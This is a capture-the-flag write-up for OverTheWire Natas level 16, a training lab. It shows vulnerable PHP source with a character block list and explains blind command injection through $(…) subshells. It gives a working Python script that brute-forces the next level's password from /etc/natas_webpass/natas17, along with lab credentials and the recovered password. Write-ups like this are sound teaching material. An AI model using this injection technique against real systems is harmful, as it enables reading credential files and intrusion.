# Writeup level 16
This challenge is similiar to the **Command Injection** ones that we have solved already. This time though we got more restrictions.  

**Source Code**
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
Okay so these are the characters that we aren't allowed to use:

- [
- ;
- |
- &
- ` 
- '
- "

Since **$** and **()** aren't forbidden, we can run commands in a subshell by doing **$(command)**. My first idea was to append the content of **/etc/natas_webpass/natas17** to a URL and do a GET-Request to my server. However this doesn't worked and to be honest I don't know why. I would guess that they have either blocked requests that someone can make or they don't have curl installed.

My next idea was to do the same attack that we did in level 15. We are going to try to get the password character by character by using grep and regular expressions. So how do we know that we have the right character? When we **grep** for a word, in my instance it's going to be August, we get a result 'cause August is a word in the **dictionary.txt** and when we grep for a word that doesn't exist we obviously won't get a result.  
So when we guessed the correct **character** our regular expression will **match** and give us the **password**. The password is going to get concatenated with August leading to **no results**. When the regular expression doesn't match then nothing will get concatenated leading to results.

**Exploit**  
We actually just need one rule for our regular expression and it's the "**^**" start of string or start of line rule.  
Our grep command inside the subshell should look like that then:  
**grep -E ^password /etc/natas_webpass/natas17**  
**password** is going to be a variable that will be filled with the correct characters of the actual password. Basically it will start with one character and is going to iterate through all characters until it finds the correct one. After that it will restart and append a second character until it matches and so on.  

**Exploit Code**  
```python
import requests
import string

symbols = string.printable[:62]
password = ""
char = 0

while char != 62:
	temp_pw = password
	password += symbols[char]
	
	payload = f"$(grep -E ^{password} /etc/natas_webpass/natas17)August"
	url = f"http://natas16.natas.labs.overthewire.org/?needle={payload}"
	r = requests.get(url, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
	
	if "August" not in r.text:
		char = 0
	else:
		password = temp_pw
		char += 1

	print(f"Password is: {password}")

# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

The passwords is:  
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
